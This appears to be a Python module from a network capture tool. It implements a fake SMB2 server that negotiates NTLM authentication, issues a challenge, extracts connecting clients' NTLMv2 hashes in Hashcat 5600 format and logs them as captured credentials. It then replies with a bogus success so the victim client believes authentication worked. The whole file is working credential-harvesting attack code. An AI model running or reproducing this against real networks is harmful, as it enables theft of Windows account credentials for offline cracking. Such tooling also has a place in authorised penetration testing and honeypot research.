"""SMB server for NTLM hash capture.

Implements a minimal SMB2 server that negotiates NTLM authentication
via SPNEGO/NTLMSSP. Captures NTLMv2 hashes in Hashcat mode 5600 format.

Flow:
1. Client: SMB2 NEGOTIATE
2. Server: SMB2 NEGOTIATE response (with NTLM security blob)
3. Client: SMB2 SESSION_SETUP with NTLMSSP Type 1 (Negotiate)
4. Server: SMB2 SESSION_SETUP with NTLMSSP Type 2 (Challenge)
5. Client: SMB2 SESSION_SETUP with NTLMSSP Type 3 (Authenticate) → hash captured
6. Server: SMB2 SESSION_SETUP success (or failure, doesn't matter)
"""

import asyncio
import logging
import struct

from .base import BaseProtocolHandler
from ..models import CapturedRequest, Protocol
from ..utils.ntlm_parser import (
    NTLM_SIGNATURE,
    build_ntlm_challenge,
    generate_challenge,
    parse_ntlm_type,
    parse_ntlm_type3,
    NTLM_NEGOTIATE,
    NTLM_AUTHENTICATE,
)

logger = logging.getLogger("pega-pega")

# SMB2 constants
SMB2_MAGIC = b"\xfeSMB"
SMB1_MAGIC = b"\xffSMB"

SMB2_NEGOTIATE = 0x0000
SMB2_SESSION_SETUP = 0x0001

STATUS_SUCCESS = 0x00000000
STATUS_MORE_PROCESSING = 0xC0000016

# Minimal SPNEGO wrapper for NTLMSSP
SPNEGO_INIT_BLOB = (
    b"\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c"
    b"\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"
    b"\xa3\x2a\x30\x28\xa0\x26\x1b\x24"
    b"not_defined_in_RFC4178@please_ignore"
)


class SmbHandler(BaseProtocolHandler):
    name = "SMB"
    default_port = 445

    async def start(self):
        server = await asyncio.start_server(
            self._handle_connection,
            host=self.bind,
            port=self.port,
        )
        self._servers.append(server)
        logger.info("SMB handler listening on %s:%d", self.bind, self.port)

    async def _handle_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        peer = writer.get_extra_info("peername")
        source_ip = peer[0] if peer else "unknown"
        source_port = peer[1] if peer else 0
        server_challenge = generate_challenge()

        try:
            while True:
                # Read NetBIOS session header (4 bytes: type + length)
                try:
                    nbt_header = await asyncio.wait_for(reader.readexactly(4), timeout=30)
                except (asyncio.TimeoutError, asyncio.IncompleteReadError, ConnectionError):
                    break

                msg_len = struct.unpack("!I", nbt_header)[0] & 0x00FFFFFF

                if msg_len == 0 or msg_len > 65535:
                    break

                try:
                    smb_data = await asyncio.wait_for(reader.readexactly(msg_len), timeout=30)
                except (asyncio.TimeoutError, asyncio.IncompleteReadError, ConnectionError):
                    break

                if len(smb_data) < 4:
                    break

                # Handle SMB1 negotiate (upgrade to SMB2)
                if smb_data[:4] == SMB1_MAGIC:
                    response = _build_smb1_negotiate_response()
                    writer.write(response)
                    await writer.drain()
                    continue

                if smb_data[:4] != SMB2_MAGIC:
                    break

                if len(smb_data) < 68:
                    break

                command = struct.unpack_from("<H", smb_data, 12)[0]

                if command == SMB2_NEGOTIATE:
                    response = _build_smb2_negotiate_response()
                    writer.write(response)
                    await writer.drain()

                elif command == SMB2_SESSION_SETUP:
                    # Extract security blob
                    ntlmssp = _extract_ntlmssp(smb_data)
                    if not ntlmssp:
                        break

                    msg_type = parse_ntlm_type(ntlmssp)

                    if msg_type == NTLM_NEGOTIATE:
                        # Send Type 2 challenge
                        challenge_msg = build_ntlm_challenge(server_challenge)
                        response = _build_session_setup_response(challenge_msg, STATUS_MORE_PROCESSING)
                        writer.write(response)
                        await writer.drain()

                    elif msg_type == NTLM_AUTHENTICATE:
                        # Parse Type 3 — capture the hash
                        result = parse_ntlm_type3(ntlmssp, server_challenge)

                        if result:
                            summary = f"AUTH {result['user']} ({result['domain']})"
                            details = {
                                "operation": "AUTH",
                                "username": result["user"],
                                "ntlm_user": result["user"],
                                "ntlm_domain": result["domain"],
                                "ntlm_hash": result["hash"],
                                "credential_type": "ntlm_v2",
                                "credential_user": result["user"],
                                "credential_secret": result["hash"],
                            }
                            logger.info(
                                "SMB NTLM hash captured: %s from %s:%d",
                                result["hash"][:60], source_ip, source_port,
                            )
                        else:
                            summary = "AUTH (parse failed)"
                            details = {"operation": "AUTH"}

                        await self.emit(CapturedRequest(
                            protocol=Protocol.SMB,
                            source_ip=source_ip,
                            source_port=source_port,
                            dest_port=self.port,
                            summary=summary,
                            details=details,
                            raw_data=smb_data,
                        ))

                        # Send success (so client thinks auth succeeded)
                        response = _build_session_setup_response(b"", STATUS_SUCCESS)
                        writer.write(response)
                        await writer.drain()
                        break
                    else:
                        break
                else:
                    # Unknown command, ignore
                    break

        except Exception:
            logger.debug("SMB connection error from %s:%d", source_ip, source_port, exc_info=True)
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass


def _extract_ntlmssp(smb_data: bytes) -> bytes | None:
    """Find NTLMSSP blob inside SMB2 SESSION_SETUP request."""
    # Look for NTLMSSP signature anywhere in the payload
    idx = smb_data.find(NTLM_SIGNATURE)
    if idx == -1:
        return None
    return smb_data[idx:]


def _build_smb1_negotiate_response() -> bytes:
    """Build SMB1 negotiate response that forces SMB2."""
    # Minimal SMB1 response with dialect index pointing to SMB2
    smb1 = bytearray()
    smb1 += SMB1_MAGIC
    smb1 += b"\x72"  # Command: Negotiate
    smb1 += struct.pack("<I", 0)  # Status: SUCCESS
    smb1 += b"\x88"  # Flags
    smb1 += struct.pack("<H", 0xC853)  # Flags2
    smb1 += b"\x00" * 12  # PID, etc.
    smb1 += struct.pack("<H", 0)  # TID
    smb1 += struct.pack("<H", 0)  # PID low
    smb1 += struct.pack("<H", 0)  # UID
    smb1 += struct.pack("<H", 0)  # MID
    # Word count = 1, dialect index = 0xFF (request SMB2)
    smb1 += b"\x01"  # Word count
    smb1 += struct.pack("<H", 0x00FF)  # Selected dialect: none, use SMB2
    smb1 += struct.pack("<H", 0)  # Byte count

    # Wrap in NetBIOS header
    nbt = struct.pack("!I", len(smb1))
    return nbt + bytes(smb1)


def _build_smb2_negotiate_response() -> bytes:
    """Build minimal SMB2 NEGOTIATE response with NTLM security."""
    header = bytearray(64)
    header[0:4] = SMB2_MAGIC
    struct.pack_into("<H", header, 4, 64)  # StructureSize
    struct.pack_into("<H", header, 6, 0)   # CreditCharge
    struct.pack_into("<I", header, 8, STATUS_SUCCESS)  # Status
    struct.pack_into("<H", header, 12, SMB2_NEGOTIATE)  # Command
    struct.pack_into("<H", header, 14, 1)  # CreditResponse

    # Negotiate response body (65 bytes fixed + security buffer)
    body = bytearray(65)
    struct.pack_into("<H", body, 0, 65)  # StructureSize
    struct.pack_into("<H", body, 2, 0)   # SecurityMode
    struct.pack_into("<H", body, 4, 0x0311)  # DialectRevision: SMB 3.1.1
    # ServerGuid (16 bytes at offset 8)
    body[8:24] = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    # Capabilities (4 bytes at offset 24)
    struct.pack_into("<I", body, 24, 0)
    # MaxTransactSize, MaxReadSize, MaxWriteSize
    struct.pack_into("<I", body, 28, 65536)
    struct.pack_into("<I", body, 32, 65536)
    struct.pack_into("<I", body, 36, 65536)

    # Security buffer: minimal SPNEGO with NTLMSSP OID
    sec_blob = _build_negotiate_spnego()
    sec_offset = 64 + 65  # header + body
    struct.pack_into("<H", body, 56, sec_offset)  # SecurityBufferOffset
    struct.pack_into("<H", body, 58, len(sec_blob))  # SecurityBufferLength

    msg = bytes(header) + bytes(body) + sec_blob
    nbt = struct.pack("!I", len(msg))
    return nbt + msg


def _build_negotiate_spnego() -> bytes:
    """Build SPNEGO NegTokenInit offering NTLMSSP."""
    # ASN.1 SPNEGO with NTLMSSP OID (1.2.840.113554.1.2.2.10 / MS NTLMSSP)
    ntlmssp_oid = b"\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"
    mech_list = b"\x30" + bytes([len(ntlmssp_oid)]) + ntlmssp_oid
    mech_types = b"\xa0" + bytes([len(mech_list)]) + mech_list
    neg_token = b"\x30" + bytes([len(mech_types)]) + mech_types
    spnego = b"\xa0" + bytes([len(neg_token)]) + neg_token
    gss_oid = b"\x06\x06\x2b\x06\x01\x05\x05\x02"
    inner = gss_oid + spnego
    return b"\x60" + bytes([len(inner)]) + inner


def _build_session_setup_response(ntlmssp_blob: bytes, status: int) -> bytes:
    """Build SMB2 SESSION_SETUP response with NTLMSSP security blob."""
    header = bytearray(64)
    header[0:4] = SMB2_MAGIC
    struct.pack_into("<H", header, 4, 64)  # StructureSize
    struct.pack_into("<H", header, 6, 0)   # CreditCharge
    struct.pack_into("<I", header, 8, status)  # Status
    struct.pack_into("<H", header, 12, SMB2_SESSION_SETUP)  # Command
    struct.pack_into("<H", header, 14, 1)  # CreditResponse

    # Session Setup response body
    body = bytearray(9)
    struct.pack_into("<H", body, 0, 9)  # StructureSize
    struct.pack_into("<H", body, 2, 0)  # SessionFlags

    if ntlmssp_blob:
        # Wrap in SPNEGO NegTokenResp
        sec_blob = _wrap_ntlmssp_in_spnego(ntlmssp_blob)
    else:
        sec_blob = b""

    sec_offset = 64 + 8  # header + body (minus 1 for padding alignment)
    struct.pack_into("<H", body, 4, sec_offset)  # SecurityBufferOffset
    struct.pack_into("<H", body, 6, len(sec_blob))  # SecurityBufferLength

    msg = bytes(header) + bytes(body)[:8] + sec_blob
    nbt = struct.pack("!I", len(msg))
    return nbt + msg


def _wrap_ntlmssp_in_spnego(ntlmssp_blob: bytes) -> bytes:
    """Wrap NTLMSSP blob in SPNEGO NegTokenResp (responseToken)."""
    # responseToken [2] OCTET STRING
    token = b"\xa2" + _asn1_length(len(ntlmssp_blob) + 2) + b"\x04" + _asn1_length(len(ntlmssp_blob)) + ntlmssp_blob
    # NegTokenResp SEQUENCE
    seq = b"\x30" + _asn1_length(len(token)) + token
    # Context tag [1]
    return b"\xa1" + _asn1_length(len(seq)) + seq


def _asn1_length(length: int) -> bytes:
    """Encode ASN.1 length."""
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return b"\x81" + bytes([length])
    else:
        return b"\x82" + struct.pack("!H", length)
